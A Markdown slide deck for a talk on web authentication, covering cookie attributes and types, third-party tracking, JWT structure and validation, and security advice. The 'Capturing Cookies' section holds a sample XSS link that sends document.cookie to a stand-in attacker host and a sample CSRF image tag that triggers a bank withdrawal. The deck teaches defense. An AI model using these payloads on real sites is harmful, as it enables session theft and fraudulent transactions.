% Web Authentication
% https://github.com/STL2600/web-auth-talk
% ![Link to Talk](images/qr-code.png) 

# Cookies

## What is a Cookie?

- Delicious
- Chocolate Chip or Go Home

## It's Also...

- Small blocks of data created by a web server and placed on the device browsing the website.

## "Magic Cookie"

- Term relates back to Unix programmers
- Reference to a Fortune Cookie

## RFC 6265 

- "HTTP State Management Mechanism"
- Approved in 2011 (obsoleting two previous standards)

# Ingredients:

- Cookie Name
- Value
- Zero or more attributes
- Attributes usually `Name=Value` format
- Lots of butter

## Example Recipe

```
__Secure-1PAPISID:"Some Hashed Value"
Created:"Sun, 27 Feb 2022 17:00:56 GMT"
Domain:".google.com"
Expires / Max-Age:"Thu, 29 Feb 2024 15:37:18 GMT"
HostOnly:false
HttpOnly:false
Last Accessed:"Fri, 04 Mar 2022 21:19:44 GMT"
Path:"/"
SameSite:"None"
Secure:true
Size:51
Butter=Goes_Here
```

# Cookie Transmit Process

When you visit a website:
```
GET /index.html HTTP/1.1
Host: www.example.org
...
```

# Cookie Transmit Process

Server sends you the website:
```
HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: theme=light
Set-Cookie: sessionToken=abc123; Expires=Wed, 09 Jun 2021 10:18:14 GMT
...
```

# Cookie Transmit Process

You visit the website again:
```
GET /spec.html HTTP/1.1
Host: www.example.org
Cookie: theme=light; sessionToken=abc123
...
```

# Cookie Flavors

- Session
- Persistent
- Secure
- HTTP-only
- Same-site
- Third-party
- Super
- Zombie

## Session Cookies

- aka In-Memory, Transient, or Non-Persistent
- Exists temporarily while a user visits a website
- Identified by a lack of expiration date assigned to them
- The browser discards them when the window is closed

## Persistent Cookies

- Expires at a specific date or specific lenght of time
- Lifespan set by cookie ~baker~ creator
- Contents transmitted every time the site is loaded
- Or when the user views resources belonging to the site
- Can also be referred to as "tracking" cookies
- Legitimate uses such as keeping users logged into websites

## Secure Cookies

- Only transmitted over encrypted connections (HTTPS)
- Won't be transmitted over HTTP
- Less likely to have data exposed
- Enabled by adding `Secure` flag the cookie

## HTTP-only Cookies

- Cannot be accessed by client-side APIs ( such as JavaScript )
- This eliminates the threat of theft by XSS attacks
- Still vulnerable to XST and CSRF
- Enabled by adding `HttpOnly` flag to the cookie

## Same-Site Cookies

- Not part of RFC 6265
- Introduced in Google Chrome in 2016
- Introduces the `SameSite` attribute
- Values are `Strict`, `Lax`, or `None`
- Currently supported by Chrome, Firefox, and Edge

## Same-site Cookies (cont.)

- `Strict` - Will only send cookies to domains that match the origin domain
  - Mitigates CSRF
- `Lax` - Will send cookies to another domain, *only*
    - For safe request like GET
    - Not for unsafe requests like POST
    - Also not to thrid-parties in iframes
- `None` - Will allow third-party cookies
    - Most browsers require `Secure` if `None` is set
    - If `SameSite` is undefined, it's treated as `None`

## Third-Party Cookies

- The domain of the cookie differs from whats in the address bar
- Usually websites that contain external content, such as ads

## Third-Party Cookie Tracking

1. Visit a website that contains content from ad-tracker.com
2. Ad-tracker content likley has HTTP-Referer flag in its header
3. HTTP-Referer flag tells Ad-tracker you were at that site
4. You recieve a cookie from ad-tracker.com
5. Visit a second site with content from ad-tracker.com
6. Your browser sends the ad-tracker cookie.
7. Just as before, HTTP-Referer tells Ad-Tracker where you are
8. The cookie tells Ad-Tracker that you were the same person

## Supercookies

- Origin domains are TLD. 
- `.com` instead of `example.com`
- Would allow malicious sites to impersonate all the sites
- Browsers block this using the Public Suffix List
- Outdated browsers may be suseptable
- No, I don't know why this is even a thing

## Zombie Cookies

- Sometimes also refered to as "Supercookies"
- Is some data or code outside of the dedicated cookie storage area
- Re-creates cookies after they've been deleted
- Could be stored in Flash or HTML5 web storage

# Capturing Cookies

- Man-in-the-Middle
- DNS Cache Poisoning
- Cross-site Scripting (XSS)
- Cross-site Request Forgery (CSRF)

## Man-in-the-Middle

- When you are able to sniff the traffic and eavesdrop
- You get lots of stuff, not just cookies
- Usually some physical proximity required

## DNS Cache Poisoning

- Attack the DNS server the victim is using
- Get it to redirect a domain to your malicious site
- Victim tries to visit the site, and is sent to you instead

## XSS

- Find a crappy website that accepts some kind of input.
- Inject malicous script onto site
- Users visiting the site will start sending you cookies!
- OM NOM NOM NOM NOM!

## XSS Example

```
<a href="#" onclick="window.location = 'http://attacker.com/stole.cgi?text=' + escape(document.cookie); return false;">Click here!</a>
```

## CSRF

- Bob checks his banking website, Bank.Example.com
- Bob finishe shis banking and forgets to log out
- After Bob goes browsing for cookie recipes on a baking forum
- I know Bob likes cookie recipes, so I post a recipe with a "picture"

## CSRF Example

```
<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
```

# Bearer Tokens / JWT

## Differences

 - Sent in the `Authorization` header instead of `Cookie`
 - Contains all content needed to authenticate users actions
 - No need to fetch external state

## Technical Specs

## Overview

`<header>.<payload>.<signature>`

## Header

```
{ "alg": "RS256", "typ": "JWT" }
```

encodes to

```
eyAiYWxnIjogIlJTMjU2IiwgInR5cCI6ICJKV1QiIH0
```

## Payload

```
{
  "iss": "https://login.my-website.com/",
  "iat": 1646408116,
  "exp": 1646409316,
  "aud": "https://my-website.com/",
  "https://my-website.com/username": "websiteAdminAccount",
  "https://my-website.com/isAdmin": true
}
```

encodes to

```
eyJpc3MiOiJodHRwczovL2xvZ2luLm15LXdlYnNpdGUuY29tLy
IsImlhdCI6MTY0NjQwODExNiwiZXhwIjoxNjQ2NDA5MzE2LCJh
dWQiOiJodHRwczovL215LXdlYnNpdGUuY29tLyIsInVzZXJuYW
1lIjoid2Vic2l0ZUFkbWluQWNjb3VudCIsImlzQWRtaW4iOnRy
dWV9Cg
```

## Signature

`SIG_ALG(secret, base64(header) + . + base64(payload)`

## Full Token

```
eyAiYWxnIjogIlJTMjU2IiwgInR5cCI6ICJKV1QiIH0.eyJpc3
MiOiJodHRwczovL2xvZ2luLm15LXdlYnNpdGUuY29tLyIsImlh
dCI6MTY0NjQwODExNiwiZXhwIjoxNjQ2NDA5MzE2LCJhdWQiOi
JodHRwczovL215LXdlYnNpdGUuY29tLyIsInVzZXJuYW1lIjoi
d2Vic2l0ZUFkbWluQWNjb3VudCIsImlzQWRtaW4iOnRydWV9Cg
.<SIGNATURE>
```

## HTTP Header

```
Authorization: Bearer eyAiYWxnIjogIlJTMjU2IiwgInR5
cCI6ICJKV1QiIH0.eyJpc3MiOiJodHRwczovL2xvZ2luLm15LX
dlYnNpdGUuY29tLyIsImlhdCI6MTY0NjQwODExNiwiZXhwIjox
NjQ2NDA5MzE2LCJhdWQiOiJodHRwczovL215LXdlYnNpdGUuY2
9tLyIsInVzZXJuYW1lIjoid2Vic2l0ZUFkbWluQWNjb3VudCIs
ImlzQWRtaW4iOnRydWV9Cg.<SIGNATURE>
```

## Claims - Standard

 - `iss` Issuer: Identifies principal that issued the JWT.
 - `sub` Subject: Identifies the subject of the JWT.
 - `aud` Audience: Identifies the recipients that the JWT is intended for.
 - `exp` Expiration Time: Identifies the expiration time on and after which the JWT must not be accepted
 - `iat` Issued at: Identifies the time at which the JWT was issued

## Claims - Custom

 - Should be namespaced to avoid collisions
 - Can contain arbritrary data
 - Examples:
   - `https://my-website.com/username`
   - `https://my-website.com/isAdmin`

# Usage

## Authentication Service

 - Dedicated login server or identity provider
 - Accepts some form of authentication
 - Returns an access token in JWT format
 - That token is provided in the `Authorization: Bearer <token>` header

## Consuming Service

 - Parse the JWT into its `header`, `payload`, and `signature`
 - Validate that the header specifies a valid algorithm
 - Check the signature against the header and payload
 - Decode the payload by parsing first as base64url, then as JSON
 - Check that the `iss` and `aud` fields are correct
 - Check that the `iat` and `exp` are current for the token
 - Check application specific claims

# JWKS - JSON Web Key Sets

 - A `.well-known` url to allow a login server to expose valid keys and algorithms for JWT signatures
 - Supports multiple keys at once for seamless rotation
 - Removes the need to configure consuming servers with any secrets
 - Adds a `kid` to the header to identify the key that should be used

# Strengths

## Immune to CSRF

 - Since the browswer will not automatically provide the authentication credential, CSRF attacks will not work

## Stateless

 - All authentication data is provided in the token, no requests to an external server are needed

## Multi-System

 - The only coordination you need between an authorizing server and one consuming the authorization is a public key

# Weaknesses

## Must use JavaScript in the browser

 - Since the browser won't attach the token automatically, a site must make an explicit request with JS

## Difficult to expire

 - If you need to be able to reoke tokens before they expire, you must have some state system
 - Can lessen the need by having short session timeouts

## alg=none

 - Some imlementations of JWT parsers allow you to specify a null signature algorithm
 - Ensure you have a list of allowed signature algorithms

## Avoid shared secrets

 - You can use symmetric encryption to sign the token
 - Avoid this, as it means any service that can validate tokens, can also create them

# General Advice

 - For simple apps, stick to cookies
 - Use an identity provider when possible
 - Don't roll your own crypto

# Questions?

![Link to Talk](images/qr-code.png) 

[https://github.com/STL2600/web-auth-talk](https://github.com/STL2600/web-auth-talk)
